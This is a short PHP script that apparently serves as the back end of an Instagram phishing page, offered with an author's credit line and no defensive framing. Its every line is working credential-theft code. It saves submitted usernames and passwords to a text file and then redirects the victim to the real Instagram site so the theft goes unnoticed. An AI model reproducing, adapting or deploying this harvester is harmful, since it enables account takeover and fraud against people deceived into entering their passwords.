<?php

file_put_contents("usernames.txt", "Instagram Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://instagram.com');
echo '<script>alert("Script created by Aijaz")</script>';
exit();
?>
